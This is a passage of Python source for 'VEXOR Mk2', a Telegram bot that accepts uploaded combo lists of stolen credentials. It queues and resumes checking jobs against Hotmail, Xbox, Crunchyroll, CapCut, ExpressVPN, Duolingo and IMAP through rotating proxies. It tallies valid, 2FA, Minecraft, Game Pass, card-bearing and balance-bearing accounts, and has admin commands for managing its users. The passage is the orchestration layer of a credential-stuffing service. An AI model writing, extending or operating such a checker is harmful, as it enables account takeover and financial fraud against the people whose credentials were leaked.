            f"{pe('❌')} <b>Session expired.</b>\nUpload the file again.",
            main_menu_kb(),
        )
        return
      mode = base_data.replace("mode_", "")
      start_or_queue_check(
          bot,
          chat_id,
          info["combos"],
          info["junk"],
          info["dup"],
          info["msg_id"],
          mode=mode,
          file_label=info.get("file_label", "combos.txt"),
      )

    elif base_data == "mode_cancel":
      _resolve_pending_batch(bot, chat_id, bid, msg_id, pop=True)
      bot.api.edit_rich(
          chat_id, msg_id, f"{pe('❌')} <b>Cancelled.</b>", main_menu_kb()
      )

    elif raw_data.startswith("admin_") and user_id == config.ADMIN_ID:
      admin.handle_admin_callback(bot, cb, raw_data)

    elif raw_data.startswith("admin_"):
      bot.api.edit_rich(
          chat_id, msg_id, f"{pe('🛑')} <b>Admin only.</b>", sub_menu_kb()
      )

    else:
      bot.api.edit_rich(
          chat_id, msg_id, f"{pe('⚠️')} <b>Unknown action.</b>", sub_menu_kb()
      )

  except Exception as e:
    log("bot", traceback.format_exc(), level="ERROR")
    try:
      bot.api.edit_rich(
          chat_id,
          msg_id,
          f"{pe('⚠️')} <b>Error.</b>\n<code>{esc_html(str(e)[:200])}</code>",
          sub_menu_kb(),
      )
    except Exception:
      pass


def _show_stats(bot, chat_id, msg_id):
  agg_line = _build_agg_line(chat_id)
  with bot.active_lock:
    active_job = bot.active.get(chat_id)
    last_job = bot.last_jobs.get(chat_id)
  q_cnt = _get_queued_count(bot, chat_id)

  if active_job:
    text = agg_line + job_status_html(active_job, queued_count=q_cnt)
    kb = job_status_kb(has_queue=(q_cnt > 0))
  elif (
      last_job
      and last_job.end_time
      and time.time() - last_job.end_time < config.LAST_JOB_RETENTION
  ):
    text = agg_line + job_final_html(last_job)
    kb = sub_menu_kb()
  else:
    text = agg_line + f"{pe('📊')} <b>No recent jobs.</b>"
    kb = sub_menu_kb()

  r = bot.api.edit_rich(chat_id, msg_id, text, kb)
  if not r.get("ok"):
    bot.api.send_rich(chat_id, text, kb)


# ═══════════════════ VEXOR BOT ═══════════════════
class VexorBot:

  def __init__(self, token=None):
    self.token = token or config.BOT_TOKEN
    self.api = TelegramAPI(self.token)
    self.offset = 0
    self.active = {}
    self.last_jobs = {}
    self.active_lock = threading.Lock()
    self.pending_zip = {}
    self.pending_check = {}  # {chat_id: {bid: batch_dict}}
    self.pending_lock = threading.Lock()
    self.pending_check_lock = threading.Lock()
    self.job_queues = load_all_queues()  # {chat_id: [queued_job_dicts]}
    self.queue_lock = threading.Lock()

    saved = config.load_usernames()
    self.usernames = {}
    self.usernames_lock = threading.Lock()
    for k, v in saved.items():
      try:
        cid = int(k)
        self.usernames[cid] = {
            "name": v.get("name", str(cid)),
            "uname": v.get("uname", ""),
        }
      except (ValueError, TypeError):
        pass

    self._stop = threading.Event()
    self._update_pool = ThreadPoolExecutor(max_workers=10)

    self._chat_locks = defaultdict(threading.Lock)
    self._chat_locks_guard = threading.Lock()

    config.admin_alert_hook = lambda html: self.api.send_rich(
        config.ADMIN_ID, html
    )

  admin_menu_kb = staticmethod(admin_menu_kb)

  def _resume_pending_jobs(self):
    states = load_job_states()
    if states:
      log("resume", f"found {len(states)} interrupted job(s)", level="INFO")
    for state in states:
      try:
        chat_id = state["chat_id"]
        remaining = [tuple(c) for c in state.get("remaining", [])]
        if not remaining and state.get("counters", {}).get("processed", 0) == 0:
          clear_job_state(chat_id)
          continue

        file_label = state.get("file_label", "combos.txt")
        job = CheckJob(
            chat_id, remaining, mode=state["mode"], file_label=file_label
        )
        job.total = state["total"]
        c = state.get("counters", {})
        job.processed = c.get("processed", 0)
        job.valid = c.get("valid", 0)
        job.free = c.get("free", 0)
        job.twofa = c.get("twofa", 0)
        job.bad = c.get("bad", 0)
        job.net = c.get("net", 0)
        job.skip = c.get("skip", 0)
        job.extracted = c.get("extracted", 0)
        job.extracting = 0
        job.throttled = c.get("throttled", 0)
        job.retried = c.get("retried", 0)
        job.recovered = c.get("recovered", 0)
        job.gamepass = c.get("gamepass", 0)
        job.minecraft = c.get("minecraft", 0)
        job.with_cards = c.get("with_cards", 0)
        job.with_balance = c.get("with_balance", 0)
        job.imap_locked = c.get("imap_locked", 0)
        job.imap_expired = c.get("imap_expired", 0)
        job.imap_rate_limited = c.get("imap_rate_limited", 0)
        job.unclear = c.get("unclear", 0)
        job.start_time = time.time()
        job.elapsed_before_pause = state.get("elapsed_before_pause", 0)
        job.valid_list = [tuple(x) for x in state.get("valid_list", [])]
        job.free_list = [tuple(x) for x in state.get("free_list", [])]
        job.resumed = True

        with self.active_lock:
          if chat_id in self.active:
            continue
          self.active[chat_id] = job

        q_cnt = _get_queued_count(self, chat_id)
        resp = self.api.send_rich(
            chat_id,
            f"{pe('🔄')} <b>Resuming interrupted job</b>\n"
            f"<pre>vexor • resume</pre>\n\n"
            f"<blockquote>"
            f"{pe('📄')} File: <code>{esc_html(file_label)}</code>\n"
            f"{pe('🎯')} Mode: {job.mode_label}\n"
            f"{pe('📦')} Remaining: <code>{len(remaining)}</code>"
            f"</blockquote>",
            job_status_kb(has_queue=(q_cnt > 0)),
        )
        job.status_msg_id = resp.get("result", {}).get("message_id")

        threading.Thread(
            target=_run_job, args=(self, job), daemon=True
        ).start()
        log(
            "resume",
            f"chat={chat_id} resumed ({len(remaining)} left)",
            level="INFO",
        )
      except Exception as e:
        log("resume", f"failed: {e}", level="ERROR")

    # Also start any persisted queued jobs for users who didn't have an active state file
    with self.queue_lock:
      queued_cids = [cid for cid, q in self.job_queues.items() if q]
    for cid in queued_cids:
      with self.active_lock:
        is_act = cid in self.active
      if not is_act:
        _pop_and_start_next_queued_job(self, cid)

  def handle_update(self, u):
    try:
      if "message" in u:
        msg = u["message"]
        chat_id = msg["chat"]["id"]
        if "document" in msg and msg["chat"].get("type") == "private":
          # Run document downloads without holding the per-chat lock so simultaneous multi-file drops & buttons stay instant
          on_document(self, msg)
        else:
          with self._chat_locks_guard:
            lock = self._chat_locks[chat_id]
          with lock:
            handle_message(self, msg)
      elif "callback_query" in u:
        cb = u["callback_query"]
        msg_obj = cb.get("message")
        if not msg_obj or "chat" not in msg_obj:
          self.api.answer_callback(cb.get("id", ""))
          return
        chat_id = msg_obj["chat"]["id"]
        with self._chat_locks_guard:
          lock = self._chat_locks[chat_id]
        with lock:
          handle_callback(self, cb)
    except Exception as e:
      log("bot", f"handle_update: {e}", level="ERROR")
      try:
        self.api.send_rich(
            config.ADMIN_ID,
            f"{pe('⚠️')} <b>Error</b>\n"
            f"<pre>{esc_html(traceback.format_exc()[:3000])}</pre>",
        )
      except Exception:
        pass

  def _signal_handler(self, signum, frame):
    if self._stop.is_set():
      print("\n[bot] Forced exit.")
      os._exit(1)
    print("\n[bot] Shutdown (Ctrl+C again to force)…")
    self._stop.set()
    with self.active_lock:
      for j in self.active.values():
        j.cancelled = True
    try:
      self._update_pool.shutdown(wait=False, cancel_futures=True)
    except TypeError:
      self._update_pool.shutdown(wait=False)

    def wait_exit():
      deadline = time.time() + 30
      while time.time() < deadline:
        with self.active_lock:
          if not self.active:
            break
        time.sleep(1)
      time.sleep(3)
      os._exit(0)

    threading.Thread(target=wait_exit, daemon=True).start()

  def _cleanup_temp(self, skip_active=True):
    tmp = Path(tempfile.gettempdir())
    now = time.time()
    with self.pending_lock:
      active = {p["zip_path"] for p in self.pending_zip.values()}

    vexor_dir = tmp / "vexor_bot"
    if vexor_dir.is_dir():
      for f in vexor_dir.iterdir():
        if str(f) in active:
          continue
        try:
          if skip_active and now - f.stat().st_mtime < config.CLEANUP_MAX_AGE:
            continue
          if f.is_dir():
            shutil.rmtree(f, ignore_errors=True)
          else:
            f.unlink()
        except Exception:
          pass

    for p in tmp.glob("vexor_zip_*"):
      try:
        if skip_active and now - p.stat().st_mtime < config.CLEANUP_MAX_AGE:
          continue
        shutil.rmtree(p, ignore_errors=True)
      except Exception:
        pass

  def _periodic_cleanup(self):
    while not self._stop.is_set():
      self._stop.wait(timeout=config.PERIODIC_CLEANUP_INTERVAL)
      if self._stop.is_set():
        return
      try:
        self._cleanup_temp(skip_active=True)
      except Exception:
        pass
      now = time.time()
      with self.pending_lock:
        expired = [
            cid
            for cid, p in self.pending_zip.items()
            if p.get("expires_at", 0) < now
        ]
        for cid in expired:
          p = self.pending_zip.pop(cid, None)
          if p:
            try:
              Path(p["zip_path"]).unlink(missing_ok=True)
            except Exception:
              pass
            try:
              shutil.rmtree(p.get("extract_dir", ""), ignore_errors=True)
            except Exception:
              pass

      with self.pending_check_lock:
        for cid in list(self.pending_check.keys()):
          batches = self.pending_check.get(cid) or {}
          stale_bids = [
              b for b, info in batches.items() if info.get("expires_at", 0) < now
          ]
          for b in stale_bids:
            batches.pop(b, None)
          if not batches:
            self.pending_check.pop(cid, None)

      prune_rate_times()

  def _prune_chat_locks(self):
    if len(self._chat_locks) > 5000:
      with self.active_lock:
        keep = set(self.active.keys())
      with self.pending_lock:
        keep |= set(self.pending_zip.keys())
      with self.pending_check_lock:
        keep |= set(self.pending_check.keys())
      with self.queue_lock:
        keep |= {cid for cid, q in self.job_queues.items() if q}
      with self._chat_locks_guard:
        self._chat_locks = defaultdict(
            threading.Lock,
            {k: v for k, v in self._chat_locks.items() if k in keep},
        )

  def run(self):
    print("═" * 60)
    print("  VEXOR Mk2 — Multi Checker + Full Debug + Auto-Queue")
    print("═" * 60)
    self._cleanup_temp(skip_active=False)
    signal.signal(signal.SIGINT, self._signal_handler)
    signal.signal(signal.SIGTERM, self._signal_handler)
    try:
      requests.get(f"{self.api.api}/deleteWebhook", timeout=10)
    except Exception:
      pass

    _user_commands = [
        {"command": "start", "description": "Start the bot / main menu"},
        {"command": "status", "description": "Current job status"},
        {"command": "queue", "description": "View queued combo files"},
        {"command": "clearqueue", "description": "Clear all queued files"},
        {"command": "cancel", "description": "Cancel active job"},
        {"command": "stats", "description": "My statistics"},
        {"command": "help", "description": "Usage guide"},
        {"command": "myid", "description": "Show your Telegram ID"},
    ]
    _admin_commands = _user_commands + [
        {"command": "allow", "description": "Add a user"},
        {"command": "deny", "description": "Remove a user"},
        {"command": "ban", "description": "Ban a user"},
        {"command": "unban", "description": "Unban a user"},
        {"command": "listusers", "description": "List allowed users"},
        {"command": "listbanned", "description": "List banned users"},
        {"command": "broadcast", "description": "Broadcast to all users"},
        {"command": "userstats", "description": "User statistics lookup"},
        {"command": "stopall", "description": "Cancel all active & queued jobs"},
        {"command": "killjob", "description": "Cancel one job by chat_id"},
        {"command": "logs", "description": "Download all debug logs ZIP"},
        {"command": "proxies", "description": "Check proxy cascade health"},
        {"command": "admin", "description": "Admin panel"},
        {"command": "ping", "description": "Bot latency check"},
    ]
    try:
      self.api.post("deleteMyCommands", json={})
      self.api.post(
          "deleteMyCommands",
          json={"scope": {"type": "chat", "chat_id": config.ADMIN_ID}},
      )
      self.api.post("setMyCommands", json={"commands": _user_commands})
      self.api.post(
          "setMyCommands",
          json={
              "commands": _admin_commands,
              "scope": {"type": "chat", "chat_id": config.ADMIN_ID},
          },
      )
    except Exception as e:
      log("bot", f"setMyCommands: {e}", level="WARN")

    try:
      me = requests.get(f"{self.api.api}/getMe", timeout=10).json()
      if me.get("ok"):
        print(f"  ✓ @{me['result']['username']}")
      else:
        print(f"  ✗ getMe: {me}")
        return
    except Exception as e:
      print(f"  ✗ connect: {e}")
      return

    if config.PROXY_ENABLED:
      print("  Proxy cascade check…")
      ok, info = verify_proxy_sample(gen_session_id())
      print(f"  {'✓ OK' if ok else '✗ FAIL'} — {info}")

    print("═" * 60)
    print(f"  Hotmail threads:     {config.THREADS}")
    print(f"  Extract threads:     {config.EXTRACT_THREADS}")
    print(f"  IMAP threads:        {config.IMAP_THREADS}")
    print(f"  Xbox threads:        {config.XBOX_THREADS}")
    print(f"  Crunchyroll threads: {config.CRUNCHY_THREADS}")
    print(f"  CapCut threads:      {config.CAPCUT_THREADS}")
    print(f"  ExpressVPN threads:  {config.EXPRESS_THREADS}")
    print(f"  Duolingo threads:    {config.DUOLINGO_THREADS}")
    print("  Full Debug Logs:     ./bot_debug.log & ./logs/*.log (Always ON)")
    print(f"  Admin:               {config.ADMIN_ID}")
    print(f"  Allowed users:       {len(list_allowed())}")
    print("═" * 60)
    print("  Running. Ctrl+C to stop.\n")

    start_health_server()
    self._resume_pending_jobs()

    threading.Thread(target=self._periodic_cleanup, daemon=True).start()

    err_count = 0
    last_prune = time.time()
    while not self._stop.is_set():
      try:
        updates = self.api.get_updates(self.offset)
        if updates is None:
          err_count += 1
          if err_count <= 3:
            log("poll", "net err", level="WARN")
          if err_count == 10:
            try:
              self.api.send_rich(
                  config.ADMIN_ID,
                  f"{pe('⚠️')} <b>Poll: 10 consecutive errors.</b>\n"
                  "Telegram API may be unreachable.",
              )
            except Exception:
              pass
          time.sleep(3)
          continue
        err_count = 0
        for u in updates:
          self.offset = u["update_id"] + 1
          self._update_pool.submit(self.handle_update, u)

        if time.time() - last_prune > 300:
          self._prune_chat_locks()
          last_prune = time.time()
      except KeyboardInterrupt:
        print("\n[bot] Stopping…")
        break
      except Exception as e:
        log("poll", f"{e}", level="ERROR")
        time.sleep(2)
    print("[bot] Stopped.")


if __name__ == "__main__":
  VexorBot().run()
